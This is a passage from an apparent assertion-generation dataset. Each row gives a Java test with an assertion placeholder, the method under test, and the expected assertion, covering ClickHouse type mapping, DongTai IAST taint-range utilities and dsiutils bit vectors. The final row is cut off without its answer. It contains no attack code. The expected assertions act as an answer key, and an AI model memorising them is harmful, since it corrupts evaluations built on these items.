of(String dataType) { if (Objects.isNull(dataType)) { return ClickHouseDataTypeEnum.String; } ClickHouseDataTypeEnum ckDataTypeEnum = CK_DATA_TYPE_MAP.get(dataType); if (Objects.nonNull(ckDataTypeEnum)) { return ckDataTypeEnum; } ClickHouseDataTypeEnum clickHouseDataTypeEnum = Optional.ofNullable(match(dataType)).orElse(Lists.newArrayList()).stream() .max(Comparator.comparing(ClickHouseDataTypeEnum::getMatchPriority)) .orElse(ClickHouseDataTypeEnum.String); CK_DATA_TYPE_MAP.put(dataType, clickHouseDataTypeEnum); return clickHouseDataTypeEnum; }"	assertEquals(Decimal, res)
"ofTest2() { String dataType = ""Decimal32(6)""; ClickHouseDataTypeEnum res = of(dataType); ""<AssertPlaceHolder>""; }
of(String dataType) { if (Objects.isNull(dataType)) { return ClickHouseDataTypeEnum.String; } ClickHouseDataTypeEnum ckDataTypeEnum = CK_DATA_TYPE_MAP.get(dataType); if (Objects.nonNull(ckDataTypeEnum)) { return ckDataTypeEnum; } ClickHouseDataTypeEnum clickHouseDataTypeEnum = Optional.ofNullable(match(dataType)).orElse(Lists.newArrayList()).stream() .max(Comparator.comparing(ClickHouseDataTypeEnum::getMatchPriority)) .orElse(ClickHouseDataTypeEnum.String); CK_DATA_TYPE_MAP.put(dataType, clickHouseDataTypeEnum); return clickHouseDataTypeEnum; }"	assertEquals(Decimal32, res)
"ofTest4() { String dataType = ""UInt32""; ClickHouseDataTypeEnum res = of(dataType); ""<AssertPlaceHolder>""; }
of(String dataType) { if (Objects.isNull(dataType)) { return ClickHouseDataTypeEnum.String; } ClickHouseDataTypeEnum ckDataTypeEnum = CK_DATA_TYPE_MAP.get(dataType); if (Objects.nonNull(ckDataTypeEnum)) { return ckDataTypeEnum; } ClickHouseDataTypeEnum clickHouseDataTypeEnum = Optional.ofNullable(match(dataType)).orElse(Lists.newArrayList()).stream() .max(Comparator.comparing(ClickHouseDataTypeEnum::getMatchPriority)) .orElse(ClickHouseDataTypeEnum.String); CK_DATA_TYPE_MAP.put(dataType, clickHouseDataTypeEnum); return clickHouseDataTypeEnum; }"	assertEquals(UInt32, res)
"extractPIDTest() { //初始化临时文件 IastProperties.initTmpDir(); //获取PID String runtimeName = ManagementFactory.getRuntimeMXBean().getName();  //Java获取的runtimeName格式为 PID@虚拟机唯一标识 提取PID String pid = EngineManager.extractPID(runtimeName); Assert.""<AssertPlaceHolder>""; }
extractPID(String runtimeName){ Pattern pattern = Pattern.compile(""^\\d+""); Matcher matcher = pattern.matcher(runtimeName);  //防止极端情况未获取到PID ，设置默认值为0，防止服务端出现问题 String extractedNumber = ""0""; if (matcher.find()) { extractedNumber  = matcher.group(); // 提取匹配到的数字 }else { DongTaiLog.warn(""Get PID parsing exception, PID raw data is {}"",runtimeName); } return extractedNumber; }"	"assertTrue(pid.matches(""\\d+""))"
"testConvert() { // 创建一个 OpenApiSchemaConvertorManager，这里可以根据需要进行配置 OpenApiSchemaConvertorManager manager = new OpenApiSchemaConvertorManager();  // 创建一个 ServiceConvertor 实例，传入需要转换的接口类 Class<?> interfaceClass = TestDubboServiceInterface.class; // 替换成实际的接口类 ServiceConvertor serviceConvertor = new ServiceConvertor(manager, interfaceClass);  // 调用 convert 方法进行转换 Map<String, Path> pathMap = serviceConvertor.convert();  // 打印转换结果或进行其他断言 for (Map.Entry<String, Path> entry : pathMap.entrySet()) { String path = entry.getKey(); Path pathData = entry.getValue(); // 进行其他断言或操作 Method method = AnalysisMethod(path); List<Parameter> parameters = pathData.getDubbo().getParameters(); Class<?>[] parameterTypes = method.getParameterTypes(); for (int i = 0, parametersSize = parameters.size(); i < parametersSize; i++) { Parameter parameter = parameters.get(i); String type = parameter.getSchema().getType(); Class<?> parameterType = parameterTypes[i]; String s = interceptType(parameterType); Assert.""<AssertPlaceHolder>""; }  } }
convert() { Map<String, Path> pathMap = new HashMap<>(); for (Method parseServiceMethod : this.parseServiceMethods()) { try { Operation convert = new MethodConvertor(this.manager, parseServiceMethod).convert(); Path path = new Path(); path.setDubbo(convert); pathMap.put(this.buildSign(parseServiceMethod), path); } catch (Throwable e) { DongTaiLog.debug(""ServiceConvertor.convert exception"", e); } } return pathMap; }"	assertTrue(s.equalsIgnoreCase(type))
"formatClassNameToDotDelimiter() { String s = StringUtils.formatClassNameToDotDelimiter(""com/foo/bar""); Assert.""<AssertPlaceHolder>""; }
formatClassNameToDotDelimiter(String className) { return replaceChar(className, '/', '.'); }"	"assertEquals(""com.foo.bar"", s)"
"formatClassNameToSlashDelimiter() { String s = StringUtils.formatClassNameToSlashDelimiter(""com.foo.bar""); Assert.""<AssertPlaceHolder>""; }
formatClassNameToSlashDelimiter(String className) { return replaceChar(className, '.', '/'); }"	"assertEquals(""com/foo/bar"", s)"
"getPrintStackTraceString() { Exception e = new Exception(); String printStackTraceString = ExceptionUtil.getPrintStackTraceString(e); Assert.""<AssertPlaceHolder>""; }
getPrintStackTraceString(Throwable e) { StringWriter stringWriter = new StringWriter(); PrintWriter printWriter = new PrintWriter(stringWriter); e.printStackTrace(printWriter); return stringWriter.toString(); }"	assertNotNull(printStackTraceString)
"getInstance() { IastClassDiagram instance = IastClassDiagram.getInstance(); Assert.""<AssertPlaceHolder>""; }
getInstance() { // DCL if (instance == null) { synchronized (IastClassDiagram.class) { if (instance == null) { instance = new IastClassDiagram(); } } } return instance; }"	assertNotNull(instance)
"testGet() { Map<Integer, PolicyNodeType> tests = new HashMap<Integer, PolicyNodeType>(){{ put(null, null); put(0, null); put(1, PolicyNodeType.PROPAGATOR); put(2, PolicyNodeType.SOURCE); put(3, PolicyNodeType.VALIDATOR); put(4, PolicyNodeType.SINK); put(5, null); }};  for (Map.Entry<Integer, PolicyNodeType> entry : tests.entrySet()) { Assert.""<AssertPlaceHolder>""; } }
get(Integer type) { if (type == null) { return null; } PolicyNodeType[] values = values(); for (PolicyNodeType policyNodeType : values) { if (policyNodeType.type == type) { return policyNodeType; } } return null; }"	"assertEquals(""get "" + entry.getKey(), entry.getValue(), PolicyNodeType.get(entry.getKey()))"
"testNormalizeSignature() { Map<List<Object>, String> tests = new HashMap<List<Object>, String>() {{ put(Arrays.asList(""java.lang.String"", ""<init>"", new String[]{""java.lang.StringBuilder""}), ""java.lang.String.<init>(java.lang.StringBuilder)""); put(Arrays.asList(""java.lang.String"", ""<init>"", new String[]{""char[]"", ""int"", ""int""}), ""java.lang.String.<init>(char[],int,int)""); put(Arrays.asList(""java.lang.StringBuilder"", ""toString"", new String[]{}), ""java.lang.StringBuilder.toString()""); }};  for (Map.Entry<List<Object>, String> entry : tests.entrySet()) { String signature = Signature.normalizeSignature((String) entry.getKey().get(0), (String) entry.getKey().get(1), (String[]) entry.getKey().get(2)); Assert.""<AssertPlaceHolder>""; } }
normalizeSignature(String className, String methodName, String[] parameters) { StringBuilder sb = new StringBuilder(64); sb.append(className); sb.append('.'); sb.append(methodName); sb.append('('); if (parameters != null && parameters.length != 0) { int i = 0; for (String parameter : parameters) { if (i > 0) { sb.append("",""); } sb.append(parameter); i++; } } sb.append(')'); return sb.toString(); }"	"assertEquals(""normalizeSignature "" + entry.getValue(), entry.getValue(), signature)"
"testEquals() { Map<String, String> tests = new HashMap<String, String>() {{ put(""java.lang.String.<init>(char[],int,int)"", ""java.lang.String.<init> (char[], int, int)""); put(""java.lang.StringBuilder.toString()"", ""java.lang.StringBuilder.toString( )""); }};  for (Map.Entry<String, String> entry : tests.entrySet()) { Assert.""<AssertPlaceHolder>""; } }
parse(String sign) { if (sign == null) { throw new IllegalArgumentException(ERR_SIGNATURE_EMPTY); } sign = sign.replaceAll("" "", """"); if (sign.isEmpty()) { throw new IllegalArgumentException(ERR_SIGNATURE_EMPTY); } int parametersStartIndex = sign.indexOf(""(""); int parametersEndIndex = sign.indexOf("")""); // a.b() if (parametersStartIndex <= 2 || parametersEndIndex <= 3 || parametersStartIndex > parametersEndIndex || parametersEndIndex != sign.length() -1) { throw new IllegalArgumentException(ERR_SIGNATURE_INVALID + "": "" + sign); }  String classAndMethod = sign.substring(0, parametersStartIndex); int methodStartIndex = classAndMethod.lastIndexOf("".""); if (methodStartIndex <= 0) { throw new IllegalArgumentException(ERR_SIGNATURE_INVALID + "": "" + sign); }  String className = classAndMethod.substring(0, methodStartIndex); String methodName = classAndMethod.substring(methodStartIndex + 1, parametersStartIndex); String parametersStr = sign.substring(parametersStartIndex + 1, parametersEndIndex).trim(); if (!parametersStr.isEmpty() && (parametersStr.contains(""("") || parametersStr.contains("")""))) { throw new IllegalArgumentException(ERR_SIGNATURE_INVALID + "": "" + sign); }  String[] parameters = new String[]{}; if (!parametersStr.isEmpty()) { parameters = parametersStr.split("",""); } return new Signature(className, methodName, parameters); }"	"assertEquals(""equals "" + entry.getKey(), Signature.parse(entry.getKey()), Signature.parse(entry.getValue()))"
"testIsObject() { Map<String, Boolean> tests = new HashMap<String, Boolean>() {{ put(""O"", true); put(""R"", false); put(""P1"", false); }};  for (Map.Entry<String, Boolean> entry : tests.entrySet()) { TaintPosition tp = new TaintPosition(entry.getKey()); Assert.""<AssertPlaceHolder>""; } }
isObject() { return this.equals(POS_OBJECT); }"	"assertEquals(""isObject "" + entry.getKey(), entry.getValue(), tp.isObject())"
"testIsReturn() { Map<String, Boolean> tests = new HashMap<String, Boolean>() {{ put(""O"", false); put(""R"", true); put(""P1"", false); }};  for (Map.Entry<String, Boolean> entry : tests.entrySet()) { TaintPosition tp = new TaintPosition(entry.getKey()); Assert.""<AssertPlaceHolder>""; } }
isReturn() { return this.equals(POS_RETURN); }"	"assertEquals(""isReturn "" + entry.getKey(), entry.getValue(), tp.isReturn())"
"testIsParameter() { Map<String, Boolean> tests = new HashMap<String, Boolean>() {{ put(""O"", false); put(""R"", false); put(""P1"", true); }};  for (Map.Entry<String, Boolean> entry : tests.entrySet()) { TaintPosition tp = new TaintPosition(entry.getKey()); Assert.""<AssertPlaceHolder>""; } }
isParameter() { return this.parameterIndex >= 0; }"	"assertEquals(""isParameter "" + entry.getKey(), entry.getValue(), tp.isParameter())"
"testGetParameterIndex() { Map<String, Integer> tests = new HashMap<String, Integer>() {{ put(""P1"", 0); put(""P12"", 11); }};  for (Map.Entry<String, Integer> entry : tests.entrySet()) { TaintPosition tp = new TaintPosition(entry.getKey()); Assert.""<AssertPlaceHolder>""; } }
getParameterIndex() { return this.parameterIndex; }"	"assertEquals(""getParameterIndex "" + entry.getKey(), entry.getValue().intValue(), tp.getParameterIndex())"
"TaintPositionException { Map<String, Boolean> tests = new HashMap<String, Boolean>() {{ put(""O"", true); put(""R"", false); put(""P1"", false); put(""O|R"", true); put(""O|P1"", true); put(""R|P1"", false); put(""O|R|P1"", true); }};  for (Map.Entry<String, Boolean> entry : tests.entrySet()) { Set<TaintPosition> tps = TaintPosition.parse(entry.getKey()); Assert.""<AssertPlaceHolder>""; } }
hasObject(Set<TaintPosition> positions) { if (positions == null) { return false; } return positions.contains(POS_OBJECT); }"	"assertEquals(""hasObject "" + entry.getKey(), entry.getValue(), TaintPosition.hasObject(tps))"
"TaintPositionException { Map<String, Boolean> tests = new HashMap<String, Boolean>() {{ put(""O"", false); put(""R"", true); put(""P1"", false); put(""O|R"", true); put(""O|P1"", false); put(""R|P1"", true); put(""O|R|P1"", true); }};  for (Map.Entry<String, Boolean> entry : tests.entrySet()) { Set<TaintPosition> tps = TaintPosition.parse(entry.getKey()); Assert.""<AssertPlaceHolder>""; } }
hasReturn(Set<TaintPosition> positions) { if (positions == null) { return false; } return positions.contains(POS_RETURN);  }"	"assertEquals(""hasReturn "" + entry.getKey(), entry.getValue(), TaintPosition.hasReturn(tps))"
"TaintPositionException { Map<String, Boolean> tests = new HashMap<String, Boolean>() {{ put(""O"", false); put(""R"", false); put(""P1"", true); put(""O|R"", false); put(""O|P1"", true); put(""R|P1"", true); put(""O|R|P1"", true); }};  for (Map.Entry<String, Boolean> entry : tests.entrySet()) { Set<TaintPosition> tps = TaintPosition.parse(entry.getKey()); Assert.""<AssertPlaceHolder>""; } }
hasParameter(Set<TaintPosition> positions) { if (positions == null) { return false; } for (TaintPosition position : positions) { if (position.isParameter()) { return true; } }  return false; }"	"assertEquals(""hasParameter "" + entry.getKey(), entry.getValue(), TaintPosition.hasParameter(tps))"
"TaintPositionException { // @formatter:off Map<Map<String, Integer>, Boolean> tests = new HashMap<Map<String, Integer>, Boolean>() {{ put(new HashMap<String, Integer>() {{ put(""O"", 0); }}, false); put(new HashMap<String, Integer>() {{ put(""R"", 1); }}, false); put(new HashMap<String, Integer>() {{ put(""P2"", 1); }}, true); put(new HashMap<String, Integer>() {{ put(""P2,4"", 1); }}, true); put(new HashMap<String, Integer>() {{ put(""P2,4"", 3); }}, true); put(new HashMap<String, Integer>() {{ put(""P2,4"", 0); }}, false); put(new HashMap<String, Integer>() {{ put(""P2,4"", 2); }}, false); put(new HashMap<String, Integer>() {{ put(""P2,4"", 4); }}, false); }}; // @formatter:on  for (Map.Entry<Map<String, Integer>, Boolean> entry : tests.entrySet()) { Set<TaintPosition> tps = TaintPosition.parse(entry.getKey().entrySet().iterator().next().getKey()); int index = entry.getKey().entrySet().iterator().next().getValue(); Assert.""<AssertPlaceHolder>""; } }
hasParameterIndex(Set<TaintPosition> positions, int index) { if (positions == null || index < 0) { return false; } for (TaintPosition position : positions) { if (position.getParameterIndex() == index) { return true; } }  return false; }"	"assertEquals(""hasParameterIndex "" + entry.getKey(), entry.getValue(), TaintPosition.hasParameterIndex(tps, index))"
"testTrim() { TaintRange tr; TaintRanges ts;  // base: TaintRange(5, 10) Map<List<Integer>, String> tests = new HashMap<List<Integer>, String>() {{ put(Arrays.asList(7, 7), ""Taints:[]""); //      |---| //    |-| put(Arrays.asList(3, 5), ""Taints:[]""); // |----| //   |----| put(Arrays.asList(7, 12), ""Taints:[untrusted(0,3)]""); //      |----| //    |----| put(Arrays.asList(3, 8), ""Taints:[untrusted(2,5)]""); //      |----| //     |------| put(Arrays.asList(4, 11), ""Taints:[untrusted(1,6)]""); //      |----| //       |-| put(Arrays.asList(6, 8), ""Taints:[untrusted(0,2)]""); //    |----| //      |---| put(Arrays.asList(7, 12), ""Taints:[untrusted(0,3)]""); //  |----| //       |-| put(Arrays.asList(10, 12), ""Taints:[]""); }};  for (Map.Entry<List<Integer>, String> entry : tests.entrySet()) { tr = new TaintRange(5, 10); ts = new TaintRanges(tr); ts.trim(entry.getKey().get(0), entry.getKey().get(1)); Assert.""<AssertPlaceHolder>""; } }
toString() { return ""Taints:"" + this.taintRanges; }"	"assertEquals(tr.toString() + "" | "" + entry.getKey().toString(), entry.getValue(), ts.toString())"
"testSplit() { Map<TaintRange, String> tests = new HashMap<TaintRange, String>() {{ put(new TaintRange(1, 4), ""Taints:[untrusted(8,13)]""); put(new TaintRange(1, 5), ""Taints:[untrusted(9,14)]""); put(new TaintRange(1, 7), ""Taints:[untrusted(11,16)]""); put(new TaintRange(1, 11), ""Taints:[untrusted(15,20)]""); put(new TaintRange(6, 7), ""Taints:[untrusted(5,6), untrusted(7,11)]""); put(new TaintRange(6, 11), ""Taints:[untrusted(5,6), untrusted(11,15)]""); put(new TaintRange(5, 15), ""Taints:[untrusted(15,20)]""); put(new TaintRange(10, 15), ""Taints:[untrusted(5,10)]""); put(new TaintRange(11, 15), ""Taints:[untrusted(5,10)]""); }};  for (Map.Entry<TaintRange, String> entry : tests.entrySet()) { TaintRanges ts = new TaintRanges(new TaintRange(5, 10)); ts.split(entry.getKey().start, entry.getKey().stop); Assert.""<AssertPlaceHolder>""; } }
toString() { return ""Taints:"" + this.taintRanges; }"	assertEquals(entry.getKey().toString(), entry.getValue(), ts.toString())
"testSubRange() { Map<TaintRange, String> tests = new HashMap<TaintRange, String>() {{ put(new TaintRange(1, 4), ""Taints:[]""); put(new TaintRange(1, 5), ""Taints:[]""); put(new TaintRange(1, 7), ""Taints:[untrusted(5,7)]""); put(new TaintRange(1, 11), ""Taints:[untrusted(5,10)]""); put(new TaintRange(6, 7), ""Taints:[untrusted(6,7)]""); put(new TaintRange(6, 11), ""Taints:[untrusted(6,10)]""); put(new TaintRange(5, 15), ""Taints:[untrusted(5,10)]""); put(new TaintRange(10, 15), ""Taints:[]""); put(new TaintRange(11, 15), ""Taints:[]""); }};  for (Map.Entry<TaintRange, String> entry : tests.entrySet()) { TaintRanges ts = new TaintRanges(new TaintRange(5, 10)); ts.subRange(entry.getKey().start, entry.getKey().stop); Assert.""<AssertPlaceHolder>""; } }
toString() { return ""Taints:"" + this.taintRanges; }"	assertEquals(entry.getKey().toString(), entry.getValue(), ts.toString())
"testRemove() { Map<TaintRange, String> tests = new HashMap<TaintRange, String>() {{ put(new TaintRange(1, 4), ""Taints:[untrusted(2,7)]""); put(new TaintRange(1, 5), ""Taints:[untrusted(1,6)]""); put(new TaintRange(1, 7), ""Taints:[untrusted(1,4)]""); put(new TaintRange(1, 11), ""Taints:[]""); put(new TaintRange(6, 7), ""Taints:[untrusted(5,9)]""); put(new TaintRange(6, 11), ""Taints:[untrusted(5,6)]""); put(new TaintRange(5, 15), ""Taints:[]""); put(new TaintRange(10, 15), ""Taints:[untrusted(5,10)]""); put(new TaintRange(11, 15), ""Taints:[untrusted(5,10)]""); }};  for (Map.Entry<TaintRange, String> entry : tests.entrySet()) { TaintRanges ts = new TaintRanges(new TaintRange(5, 10)); ts.remove(entry.getKey().start, entry.getKey().stop); Assert.""<AssertPlaceHolder>""; } }
toString() { return ""Taints:"" + this.taintRanges; }"	assertEquals(entry.getKey().toString(), entry.getValue(), ts.toString())
"testClear() { Map<TaintRange, String> tests = new HashMap<TaintRange, String>() {{ put(new TaintRange(1, 4), ""Taints:[untrusted(5,10)]""); put(new TaintRange(1, 5), ""Taints:[untrusted(5,10)]""); put(new TaintRange(1, 7), ""Taints:[untrusted(7,10)]""); put(new TaintRange(1, 11), ""Taints:[]""); put(new TaintRange(6, 7), ""Taints:[untrusted(5,6), untrusted(7,10)]""); put(new TaintRange(6, 11), ""Taints:[untrusted(5,6)]""); put(new TaintRange(5, 15), ""Taints:[]""); put(new TaintRange(10, 15), ""Taints:[untrusted(5,10)]""); put(new TaintRange(11, 15), ""Taints:[untrusted(5,10)]""); }};  for (Map.Entry<TaintRange, String> entry : tests.entrySet()) { TaintRanges ts = new TaintRanges(new TaintRange(5, 10)); ts.clear(entry.getKey().start, entry.getKey().stop); Assert.""<AssertPlaceHolder>""; } }
toString() { return ""Taints:"" + this.taintRanges; }"	assertEquals(entry.getKey().toString(), entry.getValue(), ts.toString())
"testMerge() { TaintRange tr1; TaintRange tr2; TaintRanges ts;  tr1 = new TaintRange(5, 10); Map<TaintRange, String> tests = new HashMap<TaintRange, String>() {{ put(new TaintRange(1, 4), ""Taints:[untrusted(5,10), untrusted(1,4)]""); put(new TaintRange(1, 5), ""Taints:[untrusted(1,10)]""); put(new TaintRange(1, 7), ""Taints:[untrusted(1,10)]""); put(new TaintRange(1, 11), ""Taints:[untrusted(1,11)]""); put(new TaintRange(6, 7), ""Taints:[untrusted(5,10)]""); put(new TaintRange(6, 11), ""Taints:[untrusted(5,11)]""); put(new TaintRange(5, 15), ""Taints:[untrusted(5,15)]""); put(new TaintRange(10, 15), ""Taints:[untrusted(5,15)]""); put(new TaintRange(11, 15), ""Taints:[untrusted(5,10), untrusted(11,15)]""); }};  for (Map.Entry<TaintRange, String> entry : tests.entrySet()) { tr2 = entry.getKey(); ts = new TaintRanges(tr1, tr2); TaintRanges tsCopy = ts; ts.merge(); Assert.""<AssertPlaceHolder>""; } }
toString() { return ""Taints:"" + this.taintRanges; }"	assertEquals(tsCopy.toString(), entry.getValue(), ts.toString())
"testOverlaps() { TaintRange tr1; TaintRange tr2; tr1 = new TaintRange(5, 10);  Map<TaintRange, Boolean> tests = new HashMap<TaintRange, Boolean>() {{ put(new TaintRange(1, 4), false); put(new TaintRange(1, 5), true); put(new TaintRange(1, 11), true); put(new TaintRange(9, 16), true); put(new TaintRange(10, 16), true); put(new TaintRange(11, 16), false); }}; for (Map.Entry<TaintRange, Boolean> entry : tests.entrySet()) { tr2 = entry.getKey(); Assert.""<AssertPlaceHolder>""; } }
overlaps(TaintRange range) { return range.name.equals(this.name) && this.start <= range.stop && range.start <= this.stop; }"	"assertEquals(tr1.toString() + "" | "" + tr2.toString(), entry.getValue(), tr1.overlaps(tr2))"
"testCompareRange() { TaintRange base; base = new TaintRange(5, 10);  Map<TaintRange, TaintRange.RangeRelation> tests = new HashMap<TaintRange, TaintRange.RangeRelation>() {{ put(new TaintRange(1, 4), TaintRange.RangeRelation.BELOW); put(new TaintRange(1, 5), TaintRange.RangeRelation.BELOW); put(new TaintRange(1, 6), TaintRange.RangeRelation.LOW_SPAN); put(new TaintRange(1, 10), TaintRange.RangeRelation.LOW_SPAN); put(new TaintRange(1, 11), TaintRange.RangeRelation.CONTAIN); put(new TaintRange(5, 10), TaintRange.RangeRelation.WITHIN); put(new TaintRange(5, 9), TaintRange.RangeRelation.WITHIN); put(new TaintRange(6, 10), TaintRange.RangeRelation.WITHIN); put(new TaintRange(6, 9), TaintRange.RangeRelation.WITHIN); put(new TaintRange(5, 11), TaintRange.RangeRelation.HIGH_SPAN); put(new TaintRange(6, 11), TaintRange.RangeRelation.HIGH_SPAN); put(new TaintRange(10, 12), TaintRange.RangeRelation.ABOVE); put(new TaintRange(11, 12), TaintRange.RangeRelation.ABOVE); }};  for (Map.Entry<TaintRange, TaintRange.RangeRelation> entry : tests.entrySet()) { TaintRange tr = entry.getKey(); Assert.""<AssertPlaceHolder>""; } }
compareRange(int low, int high) { if (high <= low) { throw new RuntimeException(""invalid compare, high: "" + high + "" must greater than low: "" + low); }  if (this.start < low && this.stop <= low) { // |-----| // |------| //        |------| return RangeRelation.BELOW; } else if (this.start < low && this.stop <= high) { // |----------| // |-------------| //        |------| return RangeRelation.LOW_SPAN; } else if (this.start < low) { // |-------------------| //        |------| return RangeRelation.CONTAIN; } else if (this.start < high && this.stop <= high) { //         |----| //        |-----| //         |-----| //        |------| //        |------| return RangeRelation.WITHIN; } else if (this.start < high) { //       |------| // |----------| // |------| return RangeRelation.HIGH_SPAN; } else { //        |------| //         |------| // |------| return RangeRelation.ABOVE; } }"	"assertEquals(base.toString() + "" | "" + tr.toString(), entry.getValue(), tr.compareRange(base.start, base.stop))"
"testSurrogatePairs() { final List<String> c = Arrays.asList(new String[] { ""a"", ""AB\uE000AB"", ""\uD800\uDF02"", ""\uD800\uDF03"", ""b"" }); for(final boolean utf8: new boolean[] { false, true }) for(int ratio = 1; ratio < 8; ratio++) { final FrontCodedStringBigList fcl = new FrontCodedStringBigList(c.iterator(), ratio, utf8); for (int i = 0; i < fcl.size64(); i++) { ""<AssertPlaceHolder>""; } } }
get(final long index) { return MutableString.wrap(utf8 ? byte2Char(byteFrontCodedBigList.getArray(index), null) : charFrontCodedBigList.getArray(index)); }"	assertEquals(Integer.toString(i), c.get(i), fcl.get(i).toString())
"testCount() { final MinimalAlternatingBitVector v = new MinimalAlternatingBitVector(); ""<AssertPlaceHolder>""; }
count() { long c = 0; for(long i = length(); i-- != 0;) c += getInt(i); return c; }"	assertEquals(v.length() / 2, v.count())
"testGarbageInReplace() { final LongArrayBitVector b = LongArrayBitVector.ofLength(128); b.set(64); b.replace(BooleanListBitVector.getInstance().length(64)); ""<AssertPlaceHolder>""; }
bits() { return bits; }"	assertEquals(0, b.bits()[1])
"CloneNotSupportedException { final LongArrayBitVector v = LongArrayBitVector.getInstance().length(100); for(int i = 0; i < 50; i++) v.set(i * 2); ""<AssertPlaceHolder>""; }
clone() throws CloneNotSupportedException { final LongArrayBitVector copy = (LongArrayBitVector)super.clone(); copy.bits = bits.clone(); return copy; }"	assertEquals(v, v.clone())
"testLongBig() { final LongArrayBitVector v =  LongArrayBitVector.getInstance(16 * 1024); final LongBigList l = v.asLongBigList(Short.SIZE); l.size(1); l.set(0, 511); ""<AssertPlaceHolder>""; }
bits() { return bits; }"	assertEquals(511, v.bits()[0])
"testGarbageInReplace() { final LongBigArrayBitVector b = LongBigArrayBitVector.ofLength(128); b.set(64); b.replace(BooleanListBitVector.getInstance().length(64)); ""<AssertPlaceHolder>""; }
length(final long newLength) { bits = BigArrays.ensureCapacity(bits, words(newLength), words(length)); final long oldLength = length; if (newLength < oldLength) fill(newLength, oldLength, false); length = newLength; return this; }"	assertEquals(0, b.bits[0][1])
"CloneNotSupportedException { final LongBigArrayBitVector v = LongBigArrayBitVector.getInstance().length(100); for(int i = 0; i < 50; i++) v.set(i * 2); ""<AssertPlaceHolder>""; }
clone() throws CloneNotSupportedException { final LongBigArrayBitVector copy = (LongBigArrayBitVector)super.clone(); copy.bits = bits.clone(); return copy; }"	assertEquals(v, v.clone())
"testReplaceLongBigArrayBitVector() { final LongBigArrayBitVector b = LongBigArrayBitVector.of(0, 1, 1); ""<AssertPlaceHolder>""; }
getInstance() { return new LongBigArrayBitVector(0); }"	assertEquals(b, LongBigArrayBitVector.getInstance().replace(b))
"testZeroSymbols() { final HuffmanCodec codec = new HuffmanCodec(new int[0]); ""<AssertPlaceHolder>""; }
codeWords() { return coder.codeWords(); }"	assertEquals(0, codec.codeWords().length)
"IOException { final XoRoShiRo128PlusRandom random = new XoRoShiRo128PlusRandom(0); final FastByteArrayOutputStream fbaos = new FastByteArrayOutputStream(); final OutputBitStream obs = new OutputBitStream(fbaos); for(int i = 0; i < 100000000; i++) obs.writeUnary(Long.numberOfTrailingZeros(random.nextLong())); obs.flush(); final InputBitStream ibs = new InputBitStream(fbaos.array); random.setSeed(0); for(int i = 0; i < 100000000; i++) ""<AssertPlaceHolder>""; }
readUnary() throws IOException { assert fill < 32 : fill + "" >= "" + 32; int x;  if (fill < 16) refill(); x = Integer.numberOfLeadingZeros(current << (32 - fill)); if (x < fill) { // This works also when fill = 0 readBits += x + 1; fill -= x + 1; return x; }  x = fill; while((current = read()) == 0) x += 8; x += 7 - (fill = 31 - Integer.numberOfLeadingZeros(current)); readBits += x + 1; return x; }"	assertEquals(Long.numberOfTrailingZeros(random.nextLong()), ibs.readUnary())
"IOException { final XoRoShiRo128PlusRandom random = new XoRoShiRo128PlusRandom(0); final FastByteArrayOutputStream fbaos = new FastByteArrayOutputStream(); final OutputBitStream obs = new OutputBitStream(fbaos); for(int i = 0; i < 100000000; i++) obs.writeLongUnary(Long.numberOfTrailingZeros(random.nextLong())); obs.flush(); final InputBitStream ibs = new InputBitStream(fbaos.array); random.setSeed(0); for(int i = 0; i < 100000000; i++) ""<AssertPlaceHolder>""; }
readLongUnary() throws IOException { assert fill < 32 : fill + "" >= "" + 32;  if (fill < 16) refill(); long x = Integer.numberOfLeadingZeros(current << (32 - fill)); if (x < fill) { // This works also when fill = 0 readBits += x + 1; fill -= x + 1; return x; }  x = fill; while((current = read()) == 0) x += 8; x += 7 - (fill = 31 - Integer.numberOfLeadingZeros(current)); readBits += x + 1; return x; }"	assertEquals(Long.numberOfTrailingZeros(random.nextLong()), ibs.readLongUnary())
"testWord() { final it.unimi.dsi.util.XorShift128PlusRandomGenerator random = new it.unimi.dsi.util.XorShift128PlusRandomGenerator(0); final long[][] m = XorShift.newMatrix(BITS); for(final long[] a : m) for(int i = a.length; i-- != 0;) a[i] = random.nextLong();  for(int r = 0; r < BITS - 128; r++) for(int c = 0; c < BITS / 64; c++) if (r + 64 < BITS - 64 && c + 1 < 64) ""<AssertPlaceHolder>""; }
word(final long[][] matrix, final int r, final int cw, final int bits) { if (r < 64 || r >= bits - 64) return matrix[r][cw]; if (r - cw * 64 >= 0) return matrix[r - cw * 64][0]; return matrix[r % 64][cw - r / 64]; }"	assertEquals(XorShift.word(m, r, c, BITS), XorShift.word(m, r + 64, c + 1, BITS))
"testMultiply() { final it.unimi.dsi.util.XorShift128PlusRandomGenerator random = new it.unimi.dsi.util.XorShift128PlusRandomGenerator(0); final long[][] m = XorShift.newMatrix(BITS); for(int i = 64; i-- != 0;) m[i][BITS / 64 - 1] = random.nextLong(); for(int i = 64; i-- != 0;) m[BITS - i - 1][BITS / 64 - 1] = random.nextLong(); for(int i = 64; i-- != 0;) m[BITS - 64 + i][BITS / 64 - 2] = 1L << i; for(int i = 64; i-- != 0;) m[64 + i][0] = 1L << i;  long[][] n = m;  for(int i = 0; i < 4; i++) { // final long start = - System.nanoTime(); final long[][] p = XorShift.multiply(m, n); // System.err.println(""Multiplication took "" + (System.nanoTime() + start) / 1E9 + ""s"");  for(int r = 0; r < BITS; r++) { final long t[] = new long[BITS / 64]; for(int c = 0; c < BITS; c++) if ((XorShift.word(m, r, c / 64, BITS) & 1L << c) != 0) for(int w = BITS / 64; w-- != 0;) t[w] ^= XorShift.word(n, c, w, BITS);  for(int w = BITS / 64; w-- != 0;) ""<AssertPlaceHolder>""; } n = p; } }
word(final long[][] matrix, final int r, final int cw, final int bits) { if (r < 64 || r >= bits - 64) return matrix[r][cw]; if (r - cw * 64 >= 0) return matrix[r - cw * 64][0]; return matrix[r % 64][cw - r / 64]; }"	assertEquals(t[w], XorShift.word(p, r, w, BITS))
"testMPow() { final it.unimi.dsi.util.XorShift128PlusRandomGenerator random = new it.unimi.dsi.util.XorShift128PlusRandomGenerator(0); final long[][] m = XorShift.newMatrix(BITS); for(int i = 64; i-- != 0;) m[i][BITS / 64 - 1] = random.nextLong(); for(int i = 64; i-- != 0;) m[BITS - i - 1][BITS / 64 - 1] = random.nextLong(); for(int i = 64; i-- != 0;) m[BITS - 64 + i][BITS / 64 - 2] = 1L << i; for(int i = 64; i-- != 0;) m[64 + i][0] = 1L << i;  final long[][][] q = XorShift.quad(m);  long[][] p = m; for(int i = 0; i < 12; i++) p = XorShift.multiply(p,  m);  ""<AssertPlaceHolder>""; }
